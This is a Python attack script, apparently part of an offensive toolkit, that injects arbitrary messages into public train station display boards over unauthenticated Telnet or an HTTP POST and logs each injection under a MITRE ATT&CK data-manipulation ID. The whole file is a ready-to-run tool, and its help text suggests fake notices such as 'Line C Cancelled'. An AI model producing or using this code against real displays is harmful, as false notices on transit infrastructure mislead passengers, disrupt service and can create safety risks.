#!/usr/bin/env python3
# modules/attacks/train_station_display_spoofer.py

import socket
import argparse
import os
import json
from datetime import datetime
import time

LOG_FILE = "results/train_display_spoof_log.json"
MITRE_TTP = "T1565.001"

def log_attack(ip, protocol, message):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": ip,
            "protocol": protocol,
            "message": message,
            "ttp": MITRE_TTP
        }) + "\n")

def spoof_telnet_display(ip, message):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 23))
        s.sendall(message.encode() + b'\n')
        time.sleep(1)
        s.close()
        log_attack(ip, "telnet", message)
        print(f"[✓] Injected spoof message via Telnet to {ip}")
    except Exception as e:
        print(f"[!] Telnet spoof failed: {e}")

def spoof_http_display(ip, message):
    try:
        import requests
        requests.post(f"http://{ip}/update", data={"msg": message}, timeout=5)
        log_attack(ip, "http", message)
        print(f"[✓] Injected spoof message via HTTP POST to {ip}")
    except Exception as e:
        print(f"[!] HTTP spoof failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof messages to public train station displays")
    parser.add_argument("--ip", required=True, help="Target display IP")
    parser.add_argument("--message", required=True, help="Message to spoof (e.g. 'Line C Cancelled')")
    parser.add_argument("--protocol", choices=["telnet", "http"], required=True, help="Communication protocol")
    args = parser.parse_args()

    if args.protocol == "telnet":
        spoof_telnet_display(args.ip, args.message)
    elif args.protocol == "http":
        spoof_http_display(args.ip, args.message)
